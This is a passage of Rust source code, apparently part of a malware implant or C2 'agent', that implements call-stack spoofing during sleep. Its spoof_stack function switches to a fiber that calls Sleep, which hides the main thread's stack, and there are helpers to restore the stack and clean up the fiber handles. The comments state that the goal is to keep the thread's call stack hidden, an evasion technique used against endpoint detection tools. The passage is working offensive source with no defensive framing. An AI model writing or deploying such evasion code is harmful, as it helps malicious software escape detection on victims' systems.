                                winapi::um::synchapi::Sleep(ms);
                            }
                            // Switch back to the main fiber
                            let main = MAIN_FIBER.with(|c| c.get());
                            if !main.is_null() {
                                SwitchToFiber(main);
                            }
                        }
                    }
                }
                let sf = CreateFiber(0, Some(sleep_fiber_proc), std::ptr::null_mut());
                if !sf.is_null() {
                    SLEEP_FIBER.with(|cell| cell.set(sf));
                }
                sf
            } else {
                sleep_fiber
            };

            if sleep_fiber.is_null() {
                log::warn!("spoof_stack: CreateFiber failed");
                return false;
            }

            log::debug!("spoof_stack: switching to sleep fiber (main thread stack hidden)");
            // Switch to the sleep fiber — the current thread's call stack is
            // now hidden.  The sleep fiber will call Sleep() and then
            // SwitchToFiber(main_fiber), which resumes execution right here.
            SwitchToFiber(sleep_fiber);
            LAST_SWITCH_SUCCEEDED.with(|c| c.set(true));
            true
        }
    }

    #[cfg(windows)]
    pub fn restore_stack() -> bool {
        // Switch back happens inside the sleep fiber proc automatically.
        // This function is a no-op since the fiber already returned control.
        let switched = LAST_SWITCH_SUCCEEDED.with(|c| c.replace(false));
        if switched {
            log::debug!("restore_stack: resumed from sleep fiber");
        } else {
            log::debug!("restore_stack: no fiber switch to restore");
        }
        switched
    }

    #[cfg(not(windows))]
    pub fn spoof_stack() -> bool {
        false
    }

    #[cfg(not(windows))]
    pub fn restore_stack() -> bool {
        false
    }
}

/// Release any fiber handles created by `spoof::spoof_stack` for the calling
/// thread.  Must be called before the thread exits or before the agent shuts
/// down to avoid leaking fiber memory (H-4).
pub fn cleanup_fibers() {
    #[cfg(windows)]
    {
        use winapi::um::winbase::{ConvertFiberToThread, DeleteFiber};
        spoof::SLEEP_FIBER.with(|f| {
            let handle = f.get();
            if !handle.is_null() {
                unsafe { DeleteFiber(handle) };
                f.set(std::ptr::null_mut());
            }
        });
        spoof::MAIN_FIBER.with(|f| {
            let handle = f.get();
            if !handle.is_null() {
                // The main fiber was created by ConvertThreadToFiber, which
                // makes the calling thread itself a fiber.  Release it via
                // ConvertFiberToThread; DeleteFiber on the *current* fiber
                // would terminate the thread.
                unsafe { ConvertFiberToThread() };
                f.set(std::ptr::null_mut());
            }
        });
    }
}
